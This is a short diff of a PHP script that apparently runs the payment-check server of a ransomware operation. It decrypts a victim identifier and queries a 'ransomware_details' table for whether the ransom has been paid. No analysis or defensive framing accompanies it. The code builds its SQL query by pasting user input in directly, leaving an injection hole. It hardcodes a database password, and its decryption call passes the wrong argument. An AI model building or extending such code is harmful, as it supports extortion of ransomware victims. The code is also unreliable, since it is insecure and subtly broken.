@@ -1,12 +1,18 @@
 <?php
 	if( isset($_GET['id']) && ($_SERVER['HTTP_VICTIM'])){
 		$id = $_GET['id'];
+		
+		$private_key = file_get_contents("private.pem");
+    		$res = openssl_get_privatekey($private_key,getenv('RANSOM_KEY'));
+    		openssl_private_decrypt(base64_decode($id),$dec,$id);
+    		$id = $dec;
+
 		$dbconn = pg_connect("host=localhost port=5432 dbname=ransom user=postgres password=admin");
 		if(!$dbconn){
 			echo "System Down!Try later";
 			exit;
 		}
-		$query = "SELECT payment_status from ransomware_details where identifier='$id';";
+		$query = "SELECT payment_status from ransomware_details where id='$id';";
 		$result = pg_query($dbconn,$query);
 		$tmp = pg_fetch_row($result)[0];
 		if($tmp == 'Yes'){
